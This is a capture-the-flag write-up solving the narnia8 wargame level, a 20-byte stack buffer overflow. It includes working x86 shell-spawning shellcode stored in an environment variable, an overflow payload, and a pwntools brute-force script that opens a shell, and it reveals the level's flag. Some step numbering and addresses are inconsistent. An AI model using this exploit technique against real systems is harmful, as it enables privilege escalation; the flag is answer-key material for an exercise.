## Challenge Info

**Platform:** 
**Tags :** #Challenge
**Completion Date & Time :** 2026 - 07 - 06 / 13:26

---
## FLAG : `za689KedXW`

---
## Solution :

### Step 1 : Check for `narnia8.c`
```c
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
// gcc's variable reordering fucked things up
// to keep the level in its old style i am
// making "i" global until i find a fix
// -morla
int i;

void func(char *b){
        char *blah=b;
        char bok[20];
        //int i=0;

        memset(bok, '\0', sizeof(bok));
        for(i=0; blah[i] != '\0'; i++)
                bok[i]=blah[i];

        printf("%s\n",bok);
}

int main(int argc, char **argv){

        if(argc > 1)
                func(argv[1]);
        else
        printf("%s argument\n", argv[0]);

        return 0;
}

```
From the program above, it looks like there are not very many vulnerabilities. So let's `checksec` for `nanria8` first :

```shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   40 Symbols        No    0               2               narnia8

```

There are no *canary* and *PIE*, this mean we could do `Overflow Attack` with a fixed address. 
Also *NX* is disabled, this mean we could do `ret2win overflow`.

There are several approach by changing/readdress the return address on `func`. We could make `retAddress` to point somewhere we want. We could make it point back to the buffer (*Same as previous narnia challange, but this won't work since we just has 20 bytes buffer `bok[20]`*) or we could make it point to ***Environment Variables***.

### Step 2 : Learn about the stacks
First let's try to maximize the buffer :
	Put a break after the`memset`, which is on `func+25`
```asm
gef➤  x/32x $esp
0xffffd268:     0xffffd274      0x00000000      0x00000014      0x00000000
0xffffd278:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd288:     0xffffd4ed      0xffffd298      0x08049201      0xffffd4ed
```

Here is the stacks Layout on `Func` :

| **Higher Address** |   Addr    |
| :----------------: | :-------: |
|      Argv[1]       | `ebp+0x8` |
|    Ret Address     | `ebp+0x4` |
|     Old `$ebp`     |   `ebp`   |
|      *Argv[1]      | `ebp-0x4` |
|        Bok         | `ebp-0x8` |

From the above address, `0xffffd4ed` this should be the address of `argv[1]`, there are several problems :
- If `Bok` is overflow, it will replace the address of `Argv[1]`, so it will lost it's reference, this address actually act similar to `canary`
- If the payload has different length, the address will also shifted.
- We need to find *Environment variabel* as the value of new `retAddress`.

### Step 3 : Count the byte's difference
Current payload has 20bytes length, if we want to reach the `retAddress` we need extra 12 bytes, so 32 bytes in total. This mean, the address will be shifted by 12 bytes. So the address of `argv[1]`, will be `0xffffd4e1`.
To prevent address of `argv[1]` being overwritten, after 20 character of A, we will add the address of `argv[1]`.
So, here the problem 1 and 2 has been solved.
**`Argv[1]` New address : `0xffffd4e1`**
### Step 4 : Create Environment Variable
```shell
export SHELLCODE=$(perl -e 'print "A"x200 . "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" ')
```
After create an `env var` we need to find it's address.
To find it's address, make sure we have create the env variable, then we start `gdb` again on `narnia8`, then we will  run this `print (char**)environ` (*make sure we has start the program*). That line will print the address of the first environment variable :
```shell
gef➤  print (char**)environ
$2 = (char **) 0xffffd38c
```

To find the remaining variable, we need to look at that address `x/10s *0xffffd38c`:
```shell
gef➤  x/10s *0xffffd38c
0xffffd502:     "SHELL=/bin/bash"
0xffffd512:     "SHELLCODE=", 'A' <repeats 200 times>, "j1X\231̀\211É\301jFX̀\260\vRhn/shh//bi\211\343\211\321̀"
```

Got it, now we have find the address of `SHELLCODE` : **0xffffd512**

### Step 4 : Build the Payload
```shell
$(perl -e 'print "A"x20 . "\xe1\xd4\xff\xff" . "A"x4 . "\x12\xd5\xff\xff"')
```
If we run this on `gdb`, it works very well, but the problem is, the actual address will be different with gdb (*it has several shift*), but dont worry, it wont be that much, so let's build a python file to brute them.
	Note : The only different address was `argv[1]`, environment variable will sits as it, and will not affected by `gdb stack shifting`

### Step 5 : Build python script
```python
#!/usr/bin/env python3
from pwn import *

context.log_level = "error"

for delta in range(-256, 256):
    blah = p32(0xffffd4e1 + delta)
    payload = b"A"*20 + blah + b"BBBB" + p32(0xffffd53d + 100)
    try:
        p = process(["/narnia/narnia8", payload])
        p.sendline(b"echo PWNED")
        if b"PWNED" in p.recvall(timeout=0.3):
            print("HIT at delta", delta)
            p = process(["/narnia/narnia8", payload])
            p.interactive()
            break
        p.close()
    except EOFError:
        continue
```


---
### Key Takeaways : 



---
## Related Concepts : 
[[]]

---
## Next Challenge :
[[]]